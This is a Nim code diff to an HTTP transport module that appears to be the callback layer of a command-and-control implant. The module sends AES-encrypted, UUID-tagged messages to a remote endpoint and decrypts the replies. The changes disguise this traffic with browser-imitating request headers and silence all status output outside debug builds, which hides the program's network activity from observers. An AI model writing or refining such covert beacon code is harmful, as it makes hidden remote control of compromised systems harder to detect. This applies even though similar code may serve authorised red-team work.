@@ -9,8 +9,13 @@ type
 
 proc newTransport*(): Transport =
   var headers = newHttpHeaders({
-    "User-Agent": UserAgent,
-    "Content-Type": "application/octet-stream",
+    "User-Agent":      UserAgent,
+    "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Content-Type":    "text/plain",
+    "Connection":      "keep-alive",
+    "Cache-Control":   "no-cache",
   })
   result = Transport(
     client: newHttpClient(headers = headers),
@@ -47,21 +52,26 @@ proc post*(t: Transport, currentUUID: string, aesKey: seq[byte], jsonBody: strin
   let url = t.baseUrl.strip(chars = {'/'}) & "/" & t.endpoint.strip(chars = {'/'})
   let message = buildMessage(currentUUID, aesKey, jsonBody)
 
-  stderr.writeLine("[*] POST " & url)
+  when defined(debug):
+    stderr.writeLine("[*] POST " & url)
 
   try:
     let response = t.client.post(url, body = message)
-    stderr.writeLine("[*] HTTP " & $response.status)
+    when defined(debug):
+      stderr.writeLine("[*] HTTP " & $response.status)
     let body = response.body.strip()
     if body.len == 0:
-      stderr.writeLine("[!] Empty response body")
+      when defined(debug):
+        stderr.writeLine("[!] Empty response body")
       return ""
     let rawBytes = toBytes(base64.decode(body))
     result = parseResponse(rawBytes, aesKey)
-    if result.len == 0:
-      stderr.writeLine("[!] Decrypt failed or empty response")
-    else:
-      stderr.writeLine("[+] Response OK (" & $result.len & " bytes)")
+    when defined(debug):
+      if result.len == 0:
+        stderr.writeLine("[!] Decrypt failed or empty response")
+      else:
+        stderr.writeLine("[+] Response OK (" & $result.len & " bytes)")
   except Exception as e:
-    stderr.writeLine("[!] HTTP error: " & e.msg)
+    when defined(debug):
+      stderr.writeLine("[!] HTTP error: " & e.msg)
     result = ""
